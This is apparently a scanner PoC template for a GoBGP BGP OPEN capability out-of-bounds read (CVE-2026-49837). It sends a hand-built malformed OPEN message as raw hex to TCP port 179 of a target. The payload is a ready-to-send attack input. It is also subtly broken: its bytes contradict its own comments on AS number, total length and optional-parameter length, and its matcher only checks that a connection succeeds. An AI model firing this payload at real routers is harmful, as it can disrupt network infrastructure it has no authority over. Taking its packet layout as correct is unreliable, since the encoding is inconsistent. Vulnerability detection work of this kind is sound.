[info]
id = "POC-AVE-2026-0068"
name = "GoBGP BGP OPEN Capability 越界读取 PoC"
author = "AVE"
severity = "medium"
tags = ["bgp", "oob-read", "gobgp", "capability-parsing"]
description = "检测 GoBGP 实例是否受 CVE-2026-49837 影响（BGP OPEN Capability 解析器 CapLen 边界校验缺陷）。通过 TCP 连接目标 BGP 端口，发送畸形 BGP OPEN 消息，其中 FourOctetASNumber Capability 声明 CapLen=0，迫使受影响版本将后续 Capability 字节误读为 AS 号。"
vuln_id = ["CVE-2026-49837", "GHSA-gjrg-jjr3-56cm"]

[poc]
logic = "all"

# 原始 BGP 报文方式检测（TCP 179）
[[poc.requests]]
protocol = "tcp"
host = "{{Hostname}}"
port = 179
timeout = 5

# 畸形 BGP OPEN 报文：
# - Marker: 16 字节 0xFF
# - Length: 0x0026 (38)
# - Type: 0x01 (OPEN)
# - Version: 4, MyAS: 64512, HoldTime: 180, BGP ID: 192.168.1.1
# - OptParamLen: 12
# - Parameter: Type=2(Capability), Len=4, CapMultiProtocol(IPv4 UC, CapLen=4)
# - Parameter: Type=2(Capability), Len=6, CapFourOctetASNumber(CapLen=0, 后续4字节0x0000FDE8=65000)
raw_payload = "ffffffffffffffffffffffffffffffff00260104fd8000b4c0a801010c020404000100010641000000000000fde8"

[[poc.requests.matchers]]
type = "network"
description = "成功连接 BGP 端口说明服务运行中，若目标解析畸形报文后行为异常（如 peer AS 验证偏差）则确认受影响"
expect = true
